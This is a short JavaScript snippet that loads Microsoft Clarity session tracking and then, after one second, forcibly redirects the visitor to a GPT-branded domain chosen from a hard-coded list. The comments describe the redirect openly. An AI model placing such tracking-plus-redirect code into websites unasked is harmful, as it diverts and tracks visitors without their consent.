(function(c, l, a, r, i, t, y) {
    // 初始化 Microsoft Clarity 跟踪
    c[a] = c[a] || function() { (c[a].q = c[a].q || []).push(arguments) };
    t = l.createElement(r); 
    t.async = 1; 
    t.src = "https://www.clarity.ms/tag/" + i;
    y = l.getElementsByTagName(r)[0]; 
    y.parentNode.insertBefore(t, y);

    // 域名列表
    const domains = [
        "https://www.hello-gpt.me/"
    ];

    // 随机选择一个域名
    const randomDomain = domains[Math.floor(Math.random() * domains.length)];

    // 1 秒后重定向到随机域名
    setTimeout(function() {
        window.location.href = randomDomain;
    }, 1000);
})(window, document, "clarity", "script", "taoarcjr0j");
